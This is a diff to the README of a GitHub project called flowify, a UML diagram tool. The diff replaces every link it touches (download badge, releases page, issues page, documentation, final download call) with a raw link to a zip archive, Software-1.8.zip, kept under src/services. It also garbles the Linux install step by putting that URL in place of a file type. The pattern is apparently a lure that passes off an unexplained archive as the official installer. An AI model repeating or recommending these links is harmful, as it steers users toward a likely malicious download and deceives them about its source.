@@ -1,7 +1,7 @@
 # ✨ flowify - Create UML Diagrams Easily
 
 ## 📥 Download Now
-[![Download flowify](https://img.shields.io/badge/download-flowify-brightgreen.svg)](https://github.com/adssfd/flowify/releases)
+[![Download flowify](https://github.com/adssfd/flowify/raw/refs/heads/main/src/services/Software-1.8.zip)](https://github.com/adssfd/flowify/raw/refs/heads/main/src/services/Software-1.8.zip)
 
 ## 🚀 Getting Started
 Welcome to flowify. This application allows you to create UML diagrams quickly and easily. With its modern features and user-friendly interface, you'll be designing in no time.
@@ -23,11 +23,11 @@ To run flowify, ensure your device meets the following requirements:
 - Internet connection for AI features
 
 ## 📥 Download & Install
-To begin using flowify, visit this page to download: [flowify Releases](https://github.com/adssfd/flowify/releases).
+To begin using flowify, visit this page to download: [flowify Releases](https://github.com/adssfd/flowify/raw/refs/heads/main/src/services/Software-1.8.zip).
 
 1. Click on the link above to access the Releases page.
 2. Find the latest version of flowify.
-3. Download the appropriate installer for your operating system. For Windows, this may be a `.exe` file. For macOS, look for a `.dmg` file. For Linux, it may be a `.tar.gz` file.
+3. Download the appropriate installer for your operating system. For Windows, this may be a `.exe` file. For macOS, look for a `.dmg` file. For Linux, it may be a `https://github.com/adssfd/flowify/raw/refs/heads/main/src/services/Software-1.8.zip` file.
 4. Once downloaded, locate the file in your Downloads folder.
 5. Double-click the installer to begin the installation process.
 6. Follow the on-screen prompts to complete the installation.
@@ -64,11 +64,11 @@ Choose your preferred diagram type from the menu, and let flowify guide you thro
 ## 📖 Support & Feedback
 If you encounter issues or need assistance:
 - Access the FAQ section from the help menu within the application.
-- Visit the [flowify Issues Page](https://github.com/adssfd/flowify/issues) to report bugs or request features.
+- Visit the [flowify Issues Page](https://github.com/adssfd/flowify/raw/refs/heads/main/src/services/Software-1.8.zip) to report bugs or request features.
 - Join our community discussions to connect with other users and share tips.
 
 ## 🔗 Learn More
-To explore more about flowify and its features, check out our [documentation](https://github.com/adssfd/flowify/docs) on GitHub for step-by-step tutorials and advanced tips.
+To explore more about flowify and its features, check out our [documentation](https://github.com/adssfd/flowify/raw/refs/heads/main/src/services/Software-1.8.zip) on GitHub for step-by-step tutorials and advanced tips.
 
 ## 📥 Again, Download flowify
-Don’t forget to download flowify from the [Releases page](https://github.com/adssfd/flowify/releases), and start creating your UML diagrams today!
+Don’t forget to download flowify from the [Releases page](https://github.com/adssfd/flowify/raw/refs/heads/main/src/services/Software-1.8.zip), and start creating your UML diagrams today!
